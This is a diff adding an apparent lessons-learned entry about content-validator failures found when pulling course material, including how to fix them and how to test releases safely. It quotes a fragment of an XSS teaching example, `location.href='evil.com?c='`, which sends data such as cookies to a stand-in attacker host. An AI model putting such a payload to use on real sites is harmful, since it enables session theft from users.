@@ -1240,6 +1240,33 @@ publish loop is ready, `ls` the actual repository first. See
 
 ---
 
+## 63. Pulling live bytes can expose validator failures that production tolerated
+
+The first complete pull of `mzareei/course-content` found four failures that
+were not visible from the database metadata alone. Two real teaching links in
+`week-01-lecture-2` needed explicit `external_links` declarations. The Week 3
+XSS teaching example contained the text `location.href='evil.com?c='`; the
+validator correctly scans HTML attributes, but that code sample looked like a
+relative `href` reference to the scanner.
+
+The fixes belong at the content boundary: declare legitimate teaching hosts in
+the item's metadata and write the code example in an equivalent form that
+cannot be parsed as a document attribute (`location['href']`). Do not weaken
+the validator, allow `mzareei.github.io`, or skip validation because the bytes
+already exist in production. A pull is the point where production artifacts
+become reviewable source, so the repository gate must be allowed to surface
+these mismatches.
+
+The same round-trip also confirmed the operational boundary: publishing the
+artifact does not make it student-visible. To test a newly published unreleased
+item through the real app, temporarily release it, open it through the signed-in
+student Review route, record the observed result, and close that exact test
+release afterward. Verify the final release state rather than trusting a UI
+toast; a timed-out browser action can leave the release unchanged or still
+active.
+
+---
+
 ## 57. Gated content can link straight back out to its public copy
 
 Found 2026-08-05 during the content-origin audit, by rebuilding all 23 items
